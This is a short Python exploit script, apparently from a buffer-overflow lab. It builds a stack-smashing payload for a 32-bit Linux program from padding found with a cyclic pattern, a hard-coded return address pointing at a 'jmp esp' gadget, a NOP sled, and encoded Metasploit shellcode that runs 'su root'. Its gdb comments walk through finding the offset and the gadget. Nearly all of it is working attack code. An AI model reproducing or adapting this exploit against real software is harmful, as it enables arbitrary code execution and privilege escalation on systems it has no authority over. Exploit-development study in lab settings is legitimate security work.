### Verified this works
###to execute script and pass into stdin in gdb # r <<< $(python demoexp.py)

###offset needed to crash
#buffer = "A" * 200

###buffer overflow pattern from wiremask.eu
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

###offset needed to exploit
buffer = 'A' * 55

###jmp esp #env - gdb func #info proc map# find /b start_mem, end_mem,0xff,0xe4
#0xf7defb59
#0xf7f648ab
#0xf7f705fb

eip = '\x59\xfb\xde\xf7'

nop = '\x90' * 10 #May need to adjust the 10.

###Metasploit shellcode 
###generate -b "\x00\x0d\x20\x0a" -f python

# linux/x86/exec - 70 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=su root, NullFreeVersion=false
buf =  b""
buf += b"\xd9\xee\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\xbd"
buf += b"\xb8\xdc\x41\x33\x31\x68\x1a\x83\xe8\xfc\x03\x68"
buf += b"\x16\xe2\x4d\xb6\x4a\x6b\x34\x15\x2b\xe3\x6b\xf9"
buf += b"\x3a\x14\x1b\xd2\x4f\xb3\xdb\x44\x9f\x21\xb2\xfa"
buf += b"\x56\x46\x16\xeb\x61\x89\x96\xeb\x02\xfc\xb6\x99"
buf += b"\x8b\x91\xc2\x5d\x03\x3d\xa3\xbf\x66\x41"

#print(buffer)

print(buffer + eip + nop + buf)
